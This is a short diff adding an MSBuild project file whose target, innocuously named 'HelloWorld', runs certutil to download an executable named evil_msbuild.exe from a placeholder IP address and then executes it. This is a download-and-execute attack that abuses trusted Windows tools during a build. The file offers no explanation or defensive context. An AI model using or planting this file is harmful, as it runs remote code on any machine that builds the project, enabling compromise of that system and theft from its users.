@@ -1,0 +1,6 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <Target Name="HelloWorld">
+        <Exec Command="cmd.exe /c certutil -urlcache -split -f http://IP地址/payload/white/evil_msbuild.exe" />
+        <Exec Command="evil_msbuild.exe" />
+    </Target>
+</Project>
